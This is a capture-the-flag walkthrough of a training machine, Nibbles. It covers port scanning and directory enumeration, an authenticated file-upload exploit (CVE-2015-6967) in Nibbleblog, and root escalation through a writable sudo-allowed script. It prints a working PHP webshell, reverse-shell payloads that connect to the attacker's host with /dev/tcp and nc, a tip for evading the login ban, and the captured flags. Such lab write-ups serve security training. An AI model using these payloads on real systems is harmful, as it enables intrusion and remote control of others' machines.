### Summary
We start this box with 2 `TCP` ports, `80` and `22`. Further enumeration of the web application shows an instance of `Nibbleblog` which is vulnerable to an administrator authenticated arbitrary file upload (CVE-2015-6967). We can enumerate the subdirectories with `feroxbuster` and see that the `admin` user is present. We then navigate to the admin login and guess the password `nibbler`. We upload a php webshell and gain foothold on the box as the user `nibbler`. We then see that the user is able to run passwordless sudo on a writable bash script which easily allows us to escalate to root privileges

### Tools
- `feroxbuster`
- `searchsploit`

###### [[#Recon]]
- [[#Initial Scanning]]
- [[#HTTP - TCP 80]]
- [[#CVE-2015-6967]]
	- [[#fun.php]]
###### [[#User Shell - nibbler]]
- [[#Reverse Shell]]
- [[#Enumeration]]
###### [[#Root Shell]]
- [[#monitor.sh]]

---
# Recon
## Initial Scanning
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.44.182 -oN nmap/tcp            
Completed SYN Stealth Scan at 16:20, 6.71s elapsed (65535 total ports)
Nmap scan report for 10.129.44.182
Host is up, received reset ttl 63 (0.032s latency).
Scanned at 2025-12-23 16:20:07 EST for 7s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds
           Raw packets sent: 66728 (2.936MB) | Rcvd: 65536 (2.621MB)
```
```sh
❯ sudo nmap -p 22,80 -sCV -vv 10.129.44.182 -oN nmap/tcp-scripts
Completed NSE at 16:22, 0.00s elapsed
Nmap scan report for 10.129.44.182
Host is up, received reset ttl 63 (0.027s latency).
Scanned at 2025-12-23 16:22:01 EST for 7s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn\'t have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:22
Completed NSE at 16:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:22
Completed NSE at 16:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:22
Completed NSE at 16:22, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.01 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (128B)
```
- Looks like just 2 ports, `SSH` and `HTTP`
- The TTL is consistent with a posix system
- `OpenSSH 7.2p2` and `Apache 2.4.18` indicate Ubuntu versions `16.04 - 16.10`

## HTTP - TCP 80
---
- Navigating to the web application, we're faced with an extremely bare static `HTML` page that just says `Hello World!`
- We can inspect the source to see the following:
```html
<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

- We can navigate to the `nibbleblog` directory to see an empty [Nibbleblog](https://github.com/dignajar/nibbleblog) platform
- There's a link to an RSS feed which redirects us to `feed.php` but it's empty
- We can run a `feroxbuster` subdirectory brute-force with:
```sh
❯ feroxbuster -u "http://nibbles" --burp -x html,php -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/raft-medium-directories.txt
```
- but it returns nothing :(
- If we try again with the `/nibbleblog` directory:
```sh
❯ feroxbuster -u "http://nibbles/nibbleblog" -x php,html -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/raft-medium-directories.txt -n --burp

http://nibbles/nibbleblog/admin
http://nibbles/nibbleblog/themes
http://nibbles/nibbleblog/plugins
http://nibbles/nibbleblog/content
http://nibbles/nibbleblog/languages
http://nibbles/nibbleblog/README
```
- `-n` flag since the recursion explodes very quickly


- We can perform a searchsploit for `nibbleblog` and we get a couple hits:
```sh
❯ searchsploit nibbleblog
Nibbleblog 3 - Multiple SQL Injections                | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) | php/remote/38489.rb
```
- The SQL injection vulnerability requires blog posts which we don't have as it's attacking the `index.php` and `posts.php` parameters
- The file upload vulnerability requires a username and password. A simple brute-force check of `admin:admin` `admin:password` `root:root` `root:password` doesn't work, and it bans us! We can get around this by using a different user-agent
- The intended solution is to guess `admin:nibbles` and then gain access to the administrator profile

- We can navigate to `/content` to see a walkable directory
	- `private`
	- `public`
	- `temp`
- There's nothing particularly interesting in here except for `private/users.xml`
```xml
<users>
	<user username="admin">
		<id type="integer">0</id>
		<session_fail_count type="integer">3</session_fail_count>
		<session_date type="integer">1766526869</session_date>
	</user>
		<blacklist type="string" ip="10.10.10.1">
		<date type="integer">1512964659</date>
		<fail_count type="integer">1</fail_count>
	</blacklist>
		<blacklist type="string" ip="10.10.14.50">
		<date type="integer">1766526752</date>
		<fail_count type="integer">5</fail_count> <!-- me hehe -->
	</blacklist>
</users>
```
- This proves the existence of the `admin` user

- Now that we have access to the admin dashboard, if we navigate to settings we can see that we're working with `Nibbleblog 4.0.3 "Coffee"` which is vulnerable to the arbitrary file upload exploit we saw in `searchsploit`. We'd get the same result if we navigated to the `/README` subdirectory

## CVE-2015-6967
---
- We can inspect the metasploit ruby file (but I don't know ruby) while also referencing this [cvefeed post](https://cvefeed.io/vuln/detail/CVE-2015-6967)
- It looks like if we navigate to the `myimage` plugin configuration page, we can upload an image. We can throw together a quick php webshell:
### fun.php
```php
<?php system($_GET['cmd']); ?>
```
- and upload it through the `myimage` configuration page
- It throws a few errors, but we can see if it we navigate to `content/private/plugins/my_image/image.php`
- Pass it the parameter `?ls` and we see we have code execution!

# User Shell - nibbler
## Reverse Shell
---
- We can grab a [bash reverse shell](https://www.revshells.com/) and URL encode it and send it through the php shell: `sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.50%2F12345%200%3E%261`
- This doesn't work, so instead we'll re-upload the image with our actual reverse shell payload:
```php
<?php system("/bin/sh -i >& /dev/tcp/10.10.14.50/12345 0>&1"); ?>
```
- This one failed, so did changing it to `/bin/bash`
```php
<?php system("mkfifo /tmp/f; nc 10.10.14.50 12345 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f"); ?>
```
- This one succeeded, i guess `mkfifo` is good in a desparate situation
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.44.182.
Ncat: Connection from 10.129.44.182:55350.
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("bash")'
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ^Z
[1]  + 2258872 suspended  nc -lvnp 12345
❯ stty raw -echo; fg
[1]  + 2258872 continued  nc -lvnp 12345
<ml/nibbleblog/content/private/plugins/my_image$ reset
reset: unknown terminal type unknown
Terminal type? screen

nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
<ml/nibbleblog/content/private/plugins/my_image$ cat ~/user.txt              
908b4a86866b3f7c2d532004a874a860
```

## Enumeration
---
- In our home directory, we notice `personal.zip`:
```sh
nibbler@Nibbles:/home/nibbler$ ls
personal.zip  user.txt
nibbler@Nibbles:/home/nibbler$ unzip -l personal.zip
Archive:  personal.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2017-12-10 21:58   personal/
        0  2017-12-10 22:05   personal/stuff/
     4015  2015-05-08 03:17   personal/stuff/monitor.sh
---------                     -------
     4015                     3 files
```

- We also check for nopasswd `sudo -l` and see:
```sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

# Root Shell
## monitor.sh
---
- The shell script is a system monitor, it prints a bunch of system-specific information
- We can overwrite it to recreate an instance of bash:
```sh
#!/bin/bash

bash
```
- We can then run:
```sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
root@Nibbles:/home/nibbler/personal/stuff# cat /root/root.txt
c73f6199117f6debde751e84da71b0cb
```





